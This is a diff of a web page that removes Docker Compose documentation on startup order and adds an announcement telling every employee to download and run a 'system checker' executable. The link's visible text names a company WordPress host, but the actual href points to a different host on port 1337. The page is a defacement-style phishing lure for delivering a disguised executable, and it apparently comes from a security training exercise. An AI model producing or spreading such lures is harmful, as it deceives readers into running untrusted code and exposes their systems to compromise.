@@ -1,11 +1,6 @@
-Controlling startup order in Compose
-Estimated reading time: 2 minutes
+Announcement
 
-You can control the order of service startup with the depends_on option. Compose always starts containers in dependency order, where dependencies are determined by depends_on, links, volumes_from, and network_mode: "service:...".
+This is a reminder that every employee must download and run our company's system checker. <br>
 
-However, Compose will not wait until a container is “ready” (whatever that means for your particular application) - only until it’s running. There’s a good reason for this.
-
-The problem of waiting for a database (for example) to be ready is really just a subset of a much larger problem of distributed systems. In production, your database could become unavailable or move hosts at any time. Your application needs to be resilient to these types of failures.
-
-To handle this, your application should attempt to re-establish a connection to the database after a failure. If the application retries the connection, it should eventually be able to connect to the database.
+You can download it from <a href="http://deadly-ursa.enisa.ex:1337/systemchecker.exe">http://company-wordpress.enisa.ex/systemchecker.exe</a>.
 
